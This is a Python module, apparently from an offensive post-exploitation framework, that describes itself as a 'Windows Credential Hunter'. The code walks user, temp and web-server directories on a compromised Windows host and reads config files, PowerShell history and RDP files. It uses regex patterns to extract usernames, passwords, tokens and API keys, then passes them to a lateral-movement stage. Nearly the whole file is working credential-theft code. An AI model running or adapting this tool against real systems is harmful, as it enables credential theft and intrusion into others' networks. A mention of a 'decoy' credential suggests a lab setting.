# modules/skadi.py

BANNER = r"""
                    ████ █   █  ███  ████  ███   
                   █ ░░░░█░ █ ░█ ░░█ █░░░█  █░░  
                    ███░░███ ░ █████░█░░░█░ █░░░ 
                     ░░█ █░░█ ░█░░░█░█░░ █░░█░░  
                   ████░░█░░░█ █░░░█░████ ░███░  
                    ░░░░ ░░░  ░ ░░  ░░░░░░ ░░░░  
                     ░░░░  ░   ░ ░   ░ ░░░░  ░░░  

                            4$$-.                         
                            4   ".                       
                            4    ^.                      
                            4     $                      
                            4     'b                     
                            4      "b.                   
                            4        $                   
                            4        $r                  
                            4        $F                  
                -$b========4========$b====*P=-          
                            4       *$$F                 
                            4        $$"                 
                            4       .$F                  
                            4       dP                   
                            4      F                     
                            4     @                      
                            4    .                       
                            J. .                           
                            '$$ 

    -------------------------------------------------------
              Windows Credential Hunter Module
                Author: Bruno Paniagua García
    -------------------------------------------------------
"""

import re

from state import CredentialCandidate


# ============================================================
# 1. CONFIGURACION
# ============================================================

# Superficies habituales donde pueden existir credenciales.
SEARCH_DIRECTORIES = [
    r"C:\Users",
    r"C:\ProgramData",
    r"C:\Temp",
    r"C:\Windows\Temp",
    r"C:\inetpub",
    r"C:\xampp",
    r"C:\wamp",
]

# Palabras que pueden aparecer en nombres de fichero de credenciales.
CREDENTIAL_KEYWORDS = [
    "password", "passwords", "passwd", "pwd", "pass",
    "credential", "credentials", "creds",
    "secret", "secrets", "token", "tokens",
    "apikey", "api_key", "auth",
    "login", "username", "user",
]

# Extensiones susceptibles de contener informacion sensible.
CREDENTIAL_EXTENSIONS = [
    ".txt", ".ini", ".cfg", ".conf", ".config",
    ".xml", ".json", ".csv", ".yml", ".yaml", ".env",
    ".ps1", ".bat", ".cmd", ".sql",
    ".bak", ".old", ".log", ".rdp",
]

# Extensiones tratadas como configuracion de aplicacion.
CONFIG_EXTENSIONS = {
    ".ini", ".cfg", ".conf", ".config",
    ".xml", ".json", ".yml", ".yaml", ".env",
}

# Tamaño maximo de fichero que se intentara leer (evita binarios enormes).
MAX_FILE_SIZE = 2 * 1024 * 1024  # 2 MB


# ============================================================
# PATRONES
# ============================================================
#
# Los patrones se separan en usuario / contraseña para poder
# emparejarlos despues por proximidad. Un match aislado NO se
# considera una credencial valida.

USERNAME_PATTERNS = [
    re.compile(
        r"(?im)^\s*(?:username|user|login|account)\s*[:=]\s*[\"']?([^\s\"';,]+)"
    ),
]

PASSWORD_PATTERNS = [
    re.compile(
        r"(?im)^\s*(?:password|passwd|pwd|pass|secret)\s*[:=]\s*[\"']?([^\s\"';,]+)"
    ),
]

TOKEN_PATTERNS = [
    re.compile(
        r"(?im)^\s*(?:token|api[_-]?key|apikey)\s*[:=]\s*[\"']?([^\s\"';,]+)"
    ),
]

# Credencial en linea del tipo  usuario:contraseña  (historial de PS, notas).
# Guardas para evitar falsos positivos: sin espacios, contraseña sin ':' '/' '\'.
INLINE_CREDENTIAL_PATTERN = re.compile(
    r"(?m)^\s*([A-Za-z][\w.\-\\]{1,63}):([^\s:/\\]{5,})\s*$"
)

# Campo username de un fichero .rdp:  username:s:<valor>
RDP_USERNAME_PATTERN = re.compile(r"(?im)^\s*username:s:(.+?)\s*$")

_FIELD_NAMES = {kw.lower() for kw in CREDENTIAL_KEYWORDS}


# ============================================================
# UTILIDADES
# ============================================================

def _normalise_value(value):
    """Limpia comillas/espacios y descarta valores no utiles."""
    if value is None:
        return None

    value = value.strip().strip("\"'").strip()

    if not value:
        return None

    if value.lower() in {"null", "none", "undefined", "unknown", "n/a", "na"}:
        return None

    return value


def _filename(path):
    return path.lower().rsplit("\\", 1)[-1]


def _is_interesting_file(path):
    """Interesante si la extension o el nombre sugieren credenciales."""
    name = _filename(path)
    if any(name.endswith(ext) for ext in CREDENTIAL_EXTENSIONS):
        return True
    if any(keyword in name for keyword in CREDENTIAL_KEYWORDS):
        return True
    return False


def _is_config_file(path):
    return any(path.lower().endswith(ext) for ext in CONFIG_EXTENSIONS)


def _read_file(access, path):
    """
    Lee un fichero por la capa de acceso (local en el foothold, SMB en los
    saltos con admin). Skadi NO ejecuta comandos en la victima.

    Se espera que 'access' implemente:
        access.file_size(path)
        access.read_file(path)
        access.list_files(directory, recurse=True)
    """
    try:
        size = access.file_size(path)
    except Exception:
        return ""

    if size is None or size > MAX_FILE_SIZE:
        return ""

    try:
        content = access.read_file(path)
    except Exception:
        return ""

    if content is None:
        return ""

    if isinstance(content, bytes):
        return content.decode("utf-8", errors="ignore")

    return str(content)


# ============================================================
# EXTRACTORES
# ============================================================

def _extract_key_value_pairs(content):
    """Extrae usuarios y contraseñas en formato clave=valor / clave: valor."""
    users, passwords = [], []

    for pattern in USERNAME_PATTERNS:
        for match in pattern.finditer(content):
            value = _normalise_value(match.group(1))
            if value:
                users.append({
                    "value": value,
                    "evidence": match.group(0).strip(),
                    "position": match.start(),
                })

    for pattern in PASSWORD_PATTERNS:
        for match in pattern.finditer(content):
            value = _normalise_value(match.group(1))
            if value:
                passwords.append({
                    "value": value,
                    "evidence": match.group(0).strip(),
                    "position": match.start(),
                })

    return users, passwords

def _extract_tokens(content):
    """Extrae tokens / API keys (sin usuario asociado)."""
    tokens = []
    for pattern in TOKEN_PATTERNS:
        for match in pattern.finditer(content):
            value = _normalise_value(match.group(1))
            if value:
                tokens.append({
                    "value": value,
                    "evidence": match.group(0).strip(),
                })
    return tokens


def _extract_inline_credentials(content):
    """
    Extrae pares usuario:contraseña en una sola linea (p. ej. el decoy
    'Administrator:OldP@ss2023' del historial de PowerShell), que los
    patrones clave=valor no cazan por no llevar prefijo 'password='.
    """
    results = []
    for match in INLINE_CREDENTIAL_PATTERN.finditer(content):
        user = _normalise_value(match.group(1))
        password = _normalise_value(match.group(2))

        if not user or not password:
            continue

        # Si la izquierda es un nombre de campo (password, user, token...),
        # esa linea ya la cubren los patrones clave=valor -> no duplicar.
        if user.lower() in _FIELD_NAMES:
            continue

        results.append((user, password, match.group(0).strip()))

    return results


def _extract_rdp_usernames(content):
    """
    Extrae el username de un .rdp. La contraseña de un .rdp va como blob
    DPAPI ('password 51:b:...'), no en claro, asi que solo devolvemos el
    usuario como candidato (el par completo suele estar en el readme).
    """
    usernames = []
    for match in RDP_USERNAME_PATTERN.finditer(content):
        value = _normalise_value(match.group(1))
        if value:
            usernames.append(value)
    return usernames


def _pair_credentials(users, passwords, max_distance=300):
    """Empareja usuario y contraseña solo si aparecen proximos en el fichero."""
    pairs = []
    for user in users:
        closest_password = None
        closest_distance = None
        for password in passwords:
            distance = abs(user["position"] - password["position"])
            if distance > max_distance:
                continue
            if closest_distance is None or distance < closest_distance:
                closest_password = password
                closest_distance = distance

        if closest_password is not None:
            pairs.append({
                "username": user["value"],
                "password": closest_password["value"],
                "evidence": f"{user['evidence']} | {closest_password['evidence']}",
            })
    return pairs


# ============================================================
# CLASIFICACION Y PARSEO
# ============================================================

def _classify_source(path):
    """
    Asigna a cada ruta UNA fuente (precedencia: historial > rdp > config >
    fichero interesante). Devuelve None si el fichero no interesa.
    """
    name = _filename(path)

    # Descartar ruido de Windows: hives binarios y manifiestos de apps.
    if name in ("ntuser.dat", "usrclass.dat"):
        return None

    if name == "consolehost_history.txt":
        return "powershell_history"

    if name.endswith(".rdp"):
        return "rdp_file"
    if _is_config_file(path):
        return "application_config"
    if _is_interesting_file(path):
        return "filesystem"
    return None


def _walk_and_classify(access):
    """
    UN unico recorrido del filesystem remoto. Devuelve {ruta: fuente}.
    Recorrer SMB es lento y ruidoso, asi que se pasa una sola vez.
    """
    classified = {}
    seen = set()

    for directory in SEARCH_DIRECTORIES:
        try:
            remote_files = access.list_files(directory, recurse=True)
        except Exception:
            continue

        if not remote_files:
            continue

        for path in remote_files:
            if not path or path in seen:
                continue
            seen.add(path)

            source = _classify_source(path)
            if source is not None:
                classified[path] = source

    return classified


def _parse_content(content, path, source):
    """Aplica todos los extractores a un fichero ya leido (una sola vez)."""
    candidates = []

    # username de .rdp (solo usuario; la contraseña es blob DPAPI).
    if source == "rdp_file":
        for username in _extract_rdp_usernames(content):
            candidates.append(CredentialCandidate(
                username=username, secret=None,
                source=source, location=path,
                evidence=f"username:s:{username}",
            ))

    # pares clave=valor emparejados por proximidad.
    users, passwords = _extract_key_value_pairs(content)
    for pair in _pair_credentials(users, passwords):
        candidates.append(CredentialCandidate(
            username=pair["username"], secret=pair["password"],
            source=source, location=path, evidence=pair["evidence"],
        ))

    # pares usuario:contraseña en linea (historial de PS, notas).
    for user, password, evidence in _extract_inline_credentials(content):
        candidates.append(CredentialCandidate(
            username=user, secret=password,
            source=source, location=path, evidence=evidence,
        ))

    # tokens / api keys sin usuario.
    for token in _extract_tokens(content):
        candidates.append(CredentialCandidate(
            username=None, secret=token["value"],
            source=source, location=path, evidence=token["evidence"],
        ))

    return candidates


# ============================================================
# DEDUPLICACION
# ============================================================

def _deduplicate_candidates(candidates):
    unique = []
    seen = set()
    for candidate in candidates:
        key = (
            candidate.username,
            candidate.secret,
            candidate.source,
            candidate.location,
        )
        if key in seen:
            continue
        seen.add(key)
        unique.append(candidate)
    return unique


# ============================================================
# PUNTO DE ENTRADA
# ============================================================

def credential_hunt(access):
    """
    Punto de entrada de Skadi. Odin proporciona 'access' (la conexion al
    host ya comprometido).

    Skadi NO valida credenciales ni hace movimiento lateral: eso es
    responsabilidad de Odin / FASE 3 (Thor).

    Devuelve:
        {"status": "success"|"empty", "candidates": [...], "sources": [...]}
    """
    candidates = []

    classified = _walk_and_classify(access)

    for path, source in classified.items():
        content = _read_file(access, path)
        if not content:
            continue
        candidates.extend(_parse_content(content, path, source))

    candidates = _deduplicate_candidates(candidates)

    sources = sorted(set(classified.values()))

    if not candidates:
        return {"status": "empty", "candidates": [], "sources": sources}

    return {"status": "success", "candidates": candidates, "sources": sources}